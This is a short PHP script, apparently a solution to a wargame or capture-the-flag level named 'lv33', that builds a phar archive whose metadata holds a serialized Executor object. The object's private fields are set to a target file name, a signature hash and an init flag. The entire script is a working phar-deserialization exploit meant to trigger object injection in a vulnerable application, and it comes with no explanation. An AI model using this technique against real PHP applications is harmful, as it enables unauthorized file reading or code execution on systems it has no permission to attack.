<?php
	ini_set('phar.readonly', false);
	class Executor {
		private $filename = "lv33_readpass.php"; 
        private $signature = '53f48097a54fcb93ab675e4a2ef6f449';
        private $init = false;
	}

	$phar = new Phar("test.phar");
	$phar->startBuffering();
	$phar->addFromString("test.txt", 'test');
	$phar->setStub("<?php __HALT_COMPILER(); ?>");
	$o = new Executor();
	$phar->setMetadata($o);
	$phar->stopBuffering();
?>